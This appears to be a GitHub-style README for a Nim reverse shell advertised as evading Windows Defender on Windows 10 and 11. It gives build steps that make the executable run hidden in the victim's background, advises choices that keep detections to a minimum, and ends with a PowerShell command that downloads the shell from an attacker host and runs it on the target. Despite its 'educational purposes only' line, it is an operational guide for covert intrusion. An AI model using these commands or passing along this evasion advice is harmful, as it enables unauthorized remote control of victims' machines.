# Nim Reverse Shell

A simple reverse shell is written in Nim that bypasses Windows Defender detection (see the "Tested Operating Systems" section below for more details). **This code is made for educational purposes only**.


## Tested Operating Systems

- Windows 10 (10.0.19045) 
- Windows 11 (10.0.22621)
- Windows 11 (10.0.22631)

## Installation

Installing MingW64:

```bash
apt install mingw-w64
```

Installing Nim:

```bash
apt install nim
```

## Compilation

The code can be compiled in various ways using Nim. In this example, the code is compiled to EXE using MinGW and runs in the victim's background once executed (thanks to the "--app:gui" flag). I strongly recommend following the below example for minimum detections as possible.

```bash
nim c -d:mingw --app:gui rev_shell.nim
```

## On Windows(Target Machine)

```powershell
Invoke-WebRequest -Uri http://<ip_address>:<port>/rev_shell.exe -OutFile rev_shell.exe ; ./rev_shell.exe
```
